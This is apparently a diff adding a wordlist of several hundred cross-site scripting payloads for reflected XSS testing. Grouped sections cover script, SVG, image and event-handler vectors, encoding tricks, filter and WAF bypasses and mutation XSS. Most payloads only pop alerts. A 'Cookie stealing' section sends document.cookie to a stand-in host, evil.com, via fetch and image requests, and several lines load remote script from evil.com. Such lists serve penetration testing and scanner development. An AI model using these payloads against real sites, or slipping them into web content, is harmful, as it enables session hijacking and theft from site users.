@@ -1,0 +1,978 @@
+# XSS Payloads for Reflected XSS Testing
+# Common XSS vectors
+
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+<script src=//xss.rocks/xss.js></script>
+<script src=https://evil.com/xss.js></script>
+
+# SVG-based XSS
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg onload=prompt(1)>
+<svg onload=confirm(1)>
+<svg onload=alert`1`>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<svg><script>alert&#40;1&#41;</script>
+
+# IMG-based XSS
+<img src=x onerror=alert(1)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert`1`>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=alert(document.cookie)>
+<img/src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+
+# Body-based XSS
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+<body onload=prompt(1)>
+<body onload=confirm(1)>
+
+# Input-based XSS
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input>
+<input type=text value=x onfocus=alert(1) autofocus>
+<input type=button value=xss onclick=alert(1)>
+<input type=image src=x onerror=alert(1)>
+
+# Iframe-based XSS
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe onload=alert(1)>
+<iframe/onload=alert(1)>
+<iframe  rc="data:text/html,<script>alert(1)</script>">
+
+# siddharth
+'-alert(1)-'
+
+# Details/Summary XSS
+<details open ontoggle=alert(1)>
+<details ontoggle=alert(1)><summary>xss</summary></details>
+<details open ontoggle=prompt(1)>
+
+# Object/Embed XSS
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<object data="data:text/html,<script>alert(1)</script>">
+
+# Select/Textarea XSS
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+
+# Marquee XSS
+<marquee onstart=alert(1)>
+<marquee loop=1 onfinish=alert(1)>x</marquee>
+
+# Video/Audio XSS
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+
+# Link XSS
+<link rel=stylesheet href=javascript:alert(1)>
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+
+# Form XSS
+<form action=javascript:alert(1)><input type=submit>
+<form><button formaction=javascript:alert(1)>X</button>
+<form><input formaction=javascript:alert(1) type=submit value=X>
+
+# Meta XSS
+<meta http-equiv=refresh content=0;url=javascript:alert(1)>
+<meta http-equiv=refresh content="0;javascript:alert(1)">
+
+# Style XSS
+<style>*{background:url('javascript:alert(1)')}</style>
+<style>@import'javascript:alert(1)';</style>
+<style onload=alert(1)></style>
+
+# Math XSS
+<math><mi xlink:href=javascript:alert(1)>X</mi></math>
+
+# Table XSS
+<table background=javascript:alert(1)>
+<table><td background=javascript:alert(1)>
+
+# Div XSS
+<div onload=alert(1)>
+<div style=width:expression(alert(1))>
+
+# Encoded variations
+<script>alert&#40;1&#41;</script>
+<script>alert&#x28;1&#x29;</script>
+<script>\u0061lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+
+# Event handlers
+<img src=x onabort=alert(1)>
+<img src=x onactivate=alert(1)>
+<img src=x onafterprint=alert(1)>
+<img src=x onafterupdate=alert(1)>
+<img src=x onbeforeactivate=alert(1)>
+<img src=x onbeforecopy=alert(1)>
+<img src=x onbeforecut=alert(1)>
+<img src=x onbeforedeactivate=alert(1)>
+<img src=x onbeforeeditfocus=alert(1)>
+<img src=x onbeforepaste=alert(1)>
+<img src=x onbeforeprint=alert(1)>
+<img src=x onbeforeunload=alert(1)>
+<img src=x onbeforeupdate=alert(1)>
+<img src=x onblur=alert(1)>
+<img src=x onbounce=alert(1)>
+<img src=x oncellchange=alert(1)>
+<img src=x onchange=alert(1)>
+<img src=x onclick=alert(1)>
+<img src=x oncontextmenu=alert(1)>
+<img src=x oncontrolselect=alert(1)>
+<img src=x oncopy=alert(1)>
+<img src=x oncut=alert(1)>
+<img src=x ondataavailable=alert(1)>
+<img src=x ondatasetchanged=alert(1)>
+<img src=x ondatasetcomplete=alert(1)>
+<img src=x ondblclick=alert(1)>
+<img src=x ondeactivate=alert(1)>
+<img src=x ondrag=alert(1)>
+<img src=x ondragend=alert(1)>
+<img src=x ondragenter=alert(1)>
+<img src=x ondragleave=alert(1)>
+<img src=x ondragover=alert(1)>
+<img src=x ondragstart=alert(1)>
+<img src=x ondrop=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerrorupdate=alert(1)>
+<img src=x onfilterchange=alert(1)>
+<img src=x onfinish=alert(1)>
+<img src=x onfocus=alert(1)>
+<img src=x onfocusin=alert(1)>
+<img src=x onfocusout=alert(1)>
+<img src=x onhelp=alert(1)>
+<img src=x oninput=alert(1)>
+<img src=x onkeydown=alert(1)>
+<img src=x onkeypress=alert(1)>
+<img src=x onkeyup=alert(1)>
+<img src=x onlayoutcomplete=alert(1)>
+<img src=x onload=alert(1)>
+<img src=x onlosecapture=alert(1)>
+<img src=x onmousedown=alert(1)>
+<img src=x onmouseenter=alert(1)>
+<img src=x onmouseleave=alert(1)>
+<img src=x onmousemove=alert(1)>
+<img src=x onmouseout=alert(1)>
+<img src=x onmouseover=alert(1)>
+<img src=x onmouseup=alert(1)>
+<img src=x onmousewheel=alert(1)>
+<img src=x onmove=alert(1)>
+<img src=x onmoveend=alert(1)>
+<img src=x onmovestart=alert(1)>
+<img src=x onpaste=alert(1)>
+<img src=x onpropertychange=alert(1)>
+<img src=x onreadystatechange=alert(1)>
+<img src=x onreset=alert(1)>
+<img src=x onresize=alert(1)>
+<img src=x onresizeend=alert(1)>
+<img src=x onresizestart=alert(1)>
+<img src=x onrowenter=alert(1)>
+<img src=x onrowexit=alert(1)>
+<img src=x onrowsdelete=alert(1)>
+<img src=x onrowsinserted=alert(1)>
+<img src=x onscroll=alert(1)>
+<img src=x onselect=alert(1)>
+<img src=x onselectionchange=alert(1)>
+<img src=x onselectstart=alert(1)>
+<img src=x onstart=alert(1)>
+<img src=x onstop=alert(1)>
+<img src=x onsubmit=alert(1)>
+<img src=x onunload=alert(1)>
+
+# Polyglot payloads
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:prompt(1)
+javascript:confirm(1)
+data:text/html,<script>alert(1)</script>
+data:text/html,<img src=x onerror=alert(1)>
+
+# Short payloads
+<q/oncut=alert(1)>
+<q/onclick=alert(1)>
+<q/ondrag=alert(1)>
+<q/ondrop=alert(1)>
+<q/onerror=alert(1)>
+<q/onfocus=alert(1)>
+<q/oninput=alert(1)>
+<q/onload=alert(1)>
+<q/onmove=alert(1)>
+<q/onpaste=alert(1)>
+<q/onreset=alert(1)>
+<q/onresize=alert(1)>
+<q/onscroll=alert(1)>
+<q/onselect=alert(1)>
+<q/onstart=alert(1)>
+<q/onstop=alert(1)>
+<q/onsubmit=alert(1)>
+
+# Without closing tags
+<script>alert(1)
+<img src=x onerror=alert(1)
+<svg onload=alert(1)
+<body onload=alert(1)
+
+# With newlines and tabs
+<script>
+alert(1)
+</script>
+<img	src=x	onerror=alert(1)>
+<svg
+onload=alert(1)>
+
+# Case variations
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<IMG SRC=x ONERROR=alert(1)>
+<ImG sRc=x OnErRoR=alert(1)>
+<SVG ONLOAD=alert(1)>
+<SvG oNlOaD=alert(1)>
+
+# With spaces
+< script >alert(1)< / script >
+< img src=x onerror=alert(1) >
+< svg onload=alert(1) >
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>script>alert(1)<</script>/script>
+<img src="x"onerror=alert(1)>
+<svg/onload=alert(1)>
+<svg//onload=alert(1)>
+
+# Double encoding
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+%3Csvg%20onload=alert(1)%3E
+
+# Template literals
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+
+# With comments
+<script>/**/alert(1)/**/</script>
+<script><!---->alert(1)<!----></script>
+<img src=x onerror=/**/alert(1)>
+
+# Using eval
+<script>eval('alert(1)')</script>
+<script>eval("alert(1)")</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror=eval('alert(1)')>
+<svg onload=eval('alert(1)')>
+
+# Using Function constructor
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<img src=x onerror=Function('alert(1)')()>
+
+# Using setTimeout/setInterval
+<script>setTimeout('alert(1)',0)</script>
+<script>setTimeout("alert(1)",0)</script>
+<script>setInterval('alert(1)',0)</script>
+<img src=x onerror=setTimeout('alert(1)',0)>
+
+# Location-based
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>
+
+# With unicode
+<script>\u0061lert(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<img src=x onerror=\u0061lert(1)>
+
+# With hex encoding
+<script>eval('\x61lert(1)')</script>
+<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>
+
+# Using String methods
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+# Using document.write
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+
+# Using innerHTML
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+
+# With protocol handlers
+<a href=javascript:alert(1)>X</a>
+<a href="javascript:alert(1)">X</a>
+<a href='javascript:alert(1)'>X</a>
+<a href=j&#x61vascript:alert(1)>X</a>
+<a href=j&#97vascript:alert(1)>X</a>
+
+# Form-based
+<form><button formaction=javascript:alert(1)>X</button></form>
+<form><input formaction=javascript:alert(1) type=submit value=X></form>
+<form><input type=submit formaction=javascript:alert(1) value=X></form>
+
+# Using base tag
+<base href=javascript:alert(1)//>
+
+# Using import
+<script>import('data:text/javascript,alert(1)')</script>
+
+# Mutation-based
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# With attributes
+<div id=x tabindex=1 onactivate=alert(1)></div>
+<div contenteditable onblur=alert(1)>test</div>
+<div draggable=true ondrag=alert(1)>test</div>
+
+# SVG variations
+<svg><animate onbegin=alert(1)>
+<svg><set onbegin=alert(1)>
+<svg><animatemotion onbegin=alert(1)>
+<svg><animatetransform onbegin=alert(1)>
+<svg><discard onbegin=alert(1)>
+
+# MathML
+<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>
+
+# Using srcdoc
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
+
+# Using name attribute
+<img name=alert src=x onerror=alert(1)>
+<form name=alert><input type=submit onclick=alert(1)></form>
+
+# Cookie stealing
+<script>alert(document.cookie)</script>
+<script>fetch('http://evil.com?c='+document.cookie)</script>
+<img src=x onerror=this.src='http://evil.com?c='+document.cookie>
+<svg onload=fetch('http://evil.com?c='+document.cookie)>
+
+# DOM manipulation
+<script>document.body.innerHTML+=alert(1)</script>
+<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>
+
+# Event attributes
+<body/onhashchange=alert(1)><a href=#x>clickme</a>
+<body/onpopstate=alert(1)>
+<body/onpageshow=alert(1)>
+<body/onpagehide=alert(1)>
+<body/onstorage=alert(1)>
+
+# WebSocket
+<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>
+
+# With CDATA
+<script><![CDATA[alert(1)]]></script>
+
+# XML-based
+<?xml version="1.0"?><script>alert(1)</script>
+
+# XSLT
+<?xml-stylesheet type="text/xsl" href="javascript:alert(1)"?>
+
+# With BOM
+﻿<script>alert(1)</script>
+
+# Using onerror in different contexts
+<source src=x onerror=alert(1)>
+<track src=x onerror=alert(1)>
+<image src=x onerror=alert(1)>
+<use href=x onerror=alert(1)>
+
+# Using focus/blur
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)></textarea>
+<select autofocus onfocus=alert(1)></select>
+<button autofocus onfocus=alert(1)>X</button>
+
+# Using pointer events
+<div onpointerdown=alert(1)>X</div>
+<div onpointerup=alert(1)>X</div>
+<div onpointerover=alert(1)>X</div>
+<div onpointerenter=alert(1)>X</div>
+<div onpointerleave=alert(1)>X</div>
+<div onpointermove=alert(1)>X</div>
+
+# Using touch events
+<div ontouchstart=alert(1)>X</div>
+<div ontouchend=alert(1)>X</div>
+<div ontouchmove=alert(1)>X</div>
+
+# Using animation events
+<div style="animation:spin 1s" onanimationstart=alert(1)>X</div>
+<div style="animation:spin 1s" onanimationend=alert(1)>X</div>
+<div style="animation:spin 1s" onanimationiteration=alert(1)>X</div>
+
+# Using transition events
+<div style="transition:all 1s" ontransitionend=alert(1)>X</div>
+
+# With data attributes
+<div data-x=x onclick=alert(1)>X</div>
+
+# Using accesskey
+<input accesskey=x onclick=alert(1)>
+
+# Using contenteditable
+<div contenteditable oninput=alert(1)>X</div>
+
+# Using hidden inputs
+<input type=hidden onfocus=alert(1) autofocus>
+
+# Using option elements
+<select><option oninput=alert(1)>X</option></select>
+
+# Additional img variations
+<img/src="x"/onerror=alert(1)>
+<img%20src=x%20onerror=alert(1)>
+<img	src=x	onerror=alert(1)>
+
+# Additional script variations
+<script	>alert(1)</script>
+<script
+>alert(1)</script>
+<script
+src=//evil.com></script>
+
+# Additional svg variations
+<svg/onload=prompt(1)>
+<svg/onload=confirm(1)>
+<svg/onload=print()>
+
+# Using marquee variations
+<marquee onstart=prompt(1)>X</marquee>
+<marquee onstart=confirm(1)>X</marquee>
+
+# Additional iframe variations
+<iframe/src=javascript:alert(1)>
+<iframe/onload=alert(1)>
+<iframe%20src=javascript:alert(1)>
+
+# Additional object variations
+<object/data=javascript:alert(1)>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# Additional embed variations
+<embed/src=javascript:alert(1)>
+<embed src=data:text/html,<script>alert(1)</script>>
+
+# Using var
+<var onmouseover=alert(1)>X</var>
+
+# Using code
+<code onmouseover=alert(1)>X</code>
+
+# Using span
+<span onmouseover=alert(1)>X</span>
+
+# Using p
+<p onmouseover=alert(1)>X</p>
+
+# Using h1-h6
+<h1 onmouseover=alert(1)>X</h1>
+<h2 onmouseover=alert(1)>X</h2>
+
+# Using pre
+<pre onmouseover=alert(1)>X</pre>
+
+# Using blockquote
+<blockquote onmouseover=alert(1)>X</blockquote>
+
+# Using ol/ul
+<ol onmouseover=alert(1)><li>X</li></ol>
+<ul onmouseover=alert(1)><li>X</li></ul>
+
+# Using li
+<li onmouseover=alert(1)>X</li>
+
+# Using dl/dt/dd
+<dl onmouseover=alert(1)><dt>X</dt></dl>
+<dt onmouseover=alert(1)>X</dt>
+<dd onmouseover=alert(1)>X</dd>
+
+# Using fieldset
+<fieldset onmouseover=alert(1)>X</fieldset>
+
+# Using legend
+<legend onmouseover=alert(1)>X</legend>
+
+# Using label
+<label onmouseover=alert(1)>X</label>
+
+# Using caption
+<table><caption onmouseover=alert(1)>X</caption></table>
+
+# Using colgroup
+<table><colgroup onmouseover=alert(1)></colgroup></table>
+
+# Using col
+<table><col onmouseover=alert(1)></table>
+
+# Using thead/tbody/tfoot
+<table><thead onmouseover=alert(1)></thead></table>
+<table><tbody onmouseover=alert(1)></tbody></table>
+<table><tfoot onmouseover=alert(1)></tfoot></table>
+
+# Using tr
+<table><tr onmouseover=alert(1)></tr></table>
+
+# Using th
+<table><th onmouseover=alert(1)>X</th></table>
+
+# Using td
+<table><td onmouseover=alert(1)>X</td></table>
+
+# Using meter
+<meter onmouseover=alert(1)>X</meter>
+
+# Using progress
+<progress onmouseover=alert(1)>X</progress>
+
+# Using output
+<output onmouseover=alert(1)>X</output>
+
+# Using time
+<time onmouseover=alert(1)>X</time>
+
+# Using mark
+<mark onmouseover=alert(1)>X</mark>
+
+# Using ruby
+<ruby onmouseover=alert(1)>X</ruby>
+
+# Using rt
+<ruby><rt onmouseover=alert(1)>X</rt></ruby>
+
+# Using rp
+<ruby><rp onmouseover=alert(1)>X</rp></ruby>
+
+# Using bdi
+<bdi onmouseover=alert(1)>X</bdi>
+
+# Using bdo
+<bdo onmouseover=alert(1)>X</bdo>
+
+# Using wbr
+<wbr onmouseover=alert(1)>
+
+# Using ins
+<ins onmouseover=alert(1)>X</ins>
+
+# Using del
+<del onmouseover=alert(1)>X</del>
+
+# Using small
+<small onmouseover=alert(1)>X</small>
+
+# Using strong
+<strong onmouseover=alert(1)>X</strong>
+
+# Using em
+<em onmouseover=alert(1)>X</em>
+
+# Using b
+<b onmouseover=alert(1)>X</b>
+
+# Using i
+<i onmouseover=alert(1)>X</i>
+
+# Using u
+<u onmouseover=alert(1)>X</u>
+
+# Using s
+<s onmouseover=alert(1)>X</s>
+
+# Using sub
+<sub onmouseover=alert(1)>X</sub>
+
+# Using sup
+<sup onmouseover=alert(1)>X</sup>
+
+# Using abbr
+<abbr onmouseover=alert(1)>X</abbr>
+
+# Using address
+<address onmouseover=alert(1)>X</address>
+
+# Using article
+<article onmouseover=alert(1)>X</article>
+
+# Using aside
+<aside onmouseover=alert(1)>X</aside>
+
+# Using footer
+<footer onmouseover=alert(1)>X</footer>
+
+# Using header
+<header onmouseover=alert(1)>X</header>
+
+# Using hgroup
+<hgroup onmouseover=alert(1)>X</hgroup>
+
+# Using nav
+<nav onmouseover=alert(1)>X</nav>
+
+# Using section
+<section onmouseover=alert(1)>X</section>
+
+# Using main
+<main onmouseover=alert(1)>X</main>
+
+# Using figure
+<figure onmouseover=alert(1)>X</figure>
+
+# Using figcaption
+<figcaption onmouseover=alert(1)>X</figcaption>
+
+# Using dialog
+<dialog onmouseover=alert(1)>X</dialog>
+
+# Using menu
+<menu onmouseover=alert(1)>X</menu>
+
+# Using menuitem
+<menuitem onmouseover=alert(1)>X</menuitem>
+
+# Using summary
+<details><summary onmouseover=alert(1)>X</summary></details>
+
+# Using canvas
+<canvas onmouseover=alert(1)>X</canvas>
+
+# Additional event-based
+<button onclick=alert(1)>X</button>
+<button ondblclick=alert(1)>X</button>
+<button onmousedown=alert(1)>X</button>
+<button onmouseup=alert(1)>X</button>
+
+# Context-breaking
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"></script><script>alert(1)</script>
+';alert(1);//
+";alert(1);//
+
+# Attribute context
+" onmouseover=alert(1) x="
+"onmouseover="alert(1)
+' onmouseover=alert(1) x='
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+
+# Script context breaking
+</script><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+</script><svg onload=alert(1)>
+
+# Comment breaking
+--><script>alert(1)</script>
+--!><script>alert(1)</script>
+
+# Additional short vectors
+<q/oncut=prompt(1)>
+<q/onclick=prompt(1)>
+<q/ondrag=prompt(1)>
+<q/onerror=prompt(1)>
+
+# Hash-based
+<a href=#x onclick=alert(1)>X</a>
+
+# Using name
+<a name=x onclick=alert(1)>X</a>
+
+# Using target
+<a href=x target=_blank onclick=alert(1)>X</a>
+
+# Additional polyglots
+'">><marquee onstart=confirm(1)>
+'">><marquee onstart=prompt(1)>
+'">><div onmouseover=alert(1)>X</div>
+
+# Obfuscated
+<img src=x oneonerrorrror=alert(1)>
+<img src=x onerror=alert(1) onerror=alert(1)>
+
+# Using formaction
+<button formaction=javascript:alert(1)>X</button>
+<input type=submit formaction=javascript:alert(1) value=X>
+
+# Using action
+<form action=javascript:alert(1)><button>X</button></form>
+
+# Using poster
+<video poster=javascript:alert(1)>
+
+# Using manifest
+<html manifest=javascript:alert(1)>
+
+# XSS using XML namespaces
+<html xmlns:xss><xss:script>alert(1)</xss:script></html>
+
+# Using lowsrc
+<img lowsrc=x onerror=alert(1)>
+
+# Using dynsrc
+<img dynsrc=x onerror=alert(1)>
+
+# Additional protocol handlers
+<a href=vbscript:msgbox(1)>X</a>
+<a href=about:blank>X</a>
+
+# Using pattern attribute
+<input pattern=".*" title="test" onmouseover=alert(1)>
+
+# Using placeholder
+<input placeholder="test" onmouseover=alert(1)>
+
+# Using title
+<div title="test" onmouseover=alert(1)>X</div>
+
+# Using alt
+<img alt="test" src=x onerror=alert(1)>
+
+# Using cite
+<blockquote cite=javascript:alert(1)>X</blockquote>
+
+# Using longdesc
+<img longdesc=javascript:alert(1) src=x>
+
+# Using usemap
+<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>
+
+# Using ismap
+<img ismap src=x onerror=alert(1)>
+
+# Using dirname
+<input dirname=test onchange=alert(1)>
+
+# Additional combinations
+<svg><script>alert&#40;1&#41;</script></svg>
+<svg><script>alert&#x28;1&#x29;</script></svg>
+<svg><script>&#97;lert(1)</script></svg>
+
+# Using expression
+<div style="xss:expression(alert(1))">X</div>
+<div style="background:expression(alert(1))">X</div>
+
+# Import maps
+<script type=importmap>{"imports":{"x":"javascript:alert(1)"}}</script>
+
+# Using shadowroot
+<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>
+
+# Additional data URI variations
+<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+
+# Browser-specific
+<image src=x onerror=alert(1)>
+<isindex type=submit value=X onclick=alert(1)>
+<bgsound src=x onerror=alert(1)>
+<applet code=x onerror=alert(1)>
+
+# WAF bypass attempts
+<script>al\u0065rt(1)</script>
+<script>al\x65rt(1)</script>
+<script>eval('al'+'ert(1)')</script>
+<script>eval('al\x65rt(1)')</script>
+<script>[1].find(alert)</script>
+<script>top['al'+'ert'](1)</script>
+<script>top[/al/.source+/ert/.source](1)</script>
+<script>top[8680439..toString(30)](1)</script>
+
+# Encoded angle brackets
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+
+# With null bytes
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+# Additional variations
+<script/src=//evil.com></script>
+<script	src=//evil.com></script>
+<script
+src=//evil.com></script>
+
+# Mutation XSS
+<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>
+<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>
+
+# mXSS
+<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
+<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>
+<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>
+
+# SVG with foreignObject
+<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+
+# Using slot
+<template><slot onfocus=alert(1) autofocus></slot></template>
+
+# Additional event combinations
+<input type=text onfocus=alert(1) autofocus>
+<input type=password onfocus=alert(1) autofocus>
+<input type=email onfocus=alert(1) autofocus>
+<input type=number onfocus=alert(1) autofocus>
+<input type=search onfocus=alert(1) autofocus>
+<input type=tel onfocus=alert(1) autofocus>
+<input type=url onfocus=alert(1) autofocus>
+<input type=date onfocus=alert(1) autofocus>
+<input type=time onfocus=alert(1) autofocus>
+<input type=datetime-local onfocus=alert(1) autofocus>
+<input type=month onfocus=alert(1) autofocus>
+<input type=week onfocus=alert(1) autofocus>
+<input type=color onfocus=alert(1) autofocus>
+<input type=range onfocus=alert(1) autofocus>
+
+# Additional button types
+<input type=button onclick=alert(1) value=X>
+<input type=reset onclick=alert(1) value=X>
+<input type=submit onclick=alert(1) value=X>
+
+# Using datalist
+<datalist onmouseover=alert(1)>X</datalist>
+<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>
+
+# Using keygen (deprecated but still testable)
+<keygen onfocus=alert(1) autofocus>
+<keygen onchange=alert(1)>
+
+# Custom elements
+<custom-element onclick=alert(1)>X</custom-element>
+
+# Using srcset
+<img srcset=x onerror=alert(1)>
+<source srcset=x onerror=alert(1)>
+
+# Using sizes
+<img sizes="100vw" srcset=x onerror=alert(1)>
+
+# Using crossorigin
+<img crossorigin=anonymous src=x onerror=alert(1)>
+<script crossorigin=anonymous src=x onerror=alert(1)></script>
+
+# Using integrity
+<script integrity="sha384-x" src=x onerror=alert(1)></script>
+
+# Using referrerpolicy
+<img referrerpolicy=no-referrer src=x onerror=alert(1)>
+
+# Using loading
+<img loading=lazy src=x onerror=alert(1)>
+
+# Using decoding
+<img decoding=async src=x onerror=alert(1)>
+
+# Using importance
+<img importance=high src=x onerror=alert(1)>
+
+# Additional less common events
+<img src=x onabort=alert(1)>
+<img src=x onwaiting=alert(1)>
+<img src=x onseeking=alert(1)>
+<img src=x onseeked=alert(1)>
+<img src=x onplaying=alert(1)>
+<img src=x onplay=alert(1)>
+<img src=x onpause=alert(1)>
+<img src=x onloadstart=alert(1)>
+<img src=x onloadedmetadata=alert(1)>
+<img src=x onloadeddata=alert(1)>
+<img src=x onended=alert(1)>
+<img src=x ondurationchange=alert(1)>
+<img src=x oncanplaythrough=alert(1)>
+<img src=x oncanplay=alert(1)>
+
+# Using sandbox attribute
+<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>
+
+# Using srcdoc with sandbox
+<iframe sandbox=allow-scripts srcdoc="<script>alert(1)</script>">
+
+# XSS in XML
+<root><![CDATA[<script>alert(1)</script>]]></root>
+
+# Using document.domain
+<script>alert(document.domain)</script>
+
+# Using window.location
+<script>alert(window.location)</script>
+
+# Using navigator
+<script>alert(navigator.userAgent)</script>
+
+# Using localStorage
+<script>alert(localStorage.getItem('test'))</script>
+
+# Using sessionStorage
+<script>alert(sessionStorage.getItem('test'))</script>
+
+# Chrome-specific
+<script>'alert\u0028document.domain\u0029'</script>
+
+# Firefox-specific
+<script>alert(window.name)</script>
+
+# Safari-specific
+<script>alert(window.safari)</script>
+
+# Edge-specific
+<script>alert(window.chrome)</script>
+
+# Additional rare tags
+<blink onmouseover=alert(1)>X</blink>
+<acronym onmouseover=alert(1)>X</acronym>
+<big onmouseover=alert(1)>X</big>
+<center onmouseover=alert(1)>X</center>
+<dir onmouseover=alert(1)>X</dir>
+<font onmouseover=alert(1)>X</font>
+<frame onload=alert(1)>
+<frameset onload=alert(1)>
+<noframes onload=alert(1)>
+<strike onmouseover=alert(1)>X</strike>
+<tt onmouseover=alert(1)>X</tt>
+
+# Final variations
+<script>alert(1);alert(2);alert(3)</script>
+<script>for(i=0;i<3;i++){alert(i)}</script>
+<script>while(1){alert(1);break}</script>
+<script>if(1){alert(1)}</script>
+<script>try{alert(1)}catch(e){}</script>
+<script>alert(1)||alert(2)</script>
+<script>alert(1)&&alert(2)</script>
+<script>alert(1)?alert(2):alert(3)</script>
+<script>alert([1,2,3])</script>
+<script>alert({x:1,y:2})</script>
+<script>alert(function(){return 1}())</script>
+<script>alert((()=>1)())</script>
+<script>alert(class{constructor(){return 1}})</script>
+
+# End of payloads
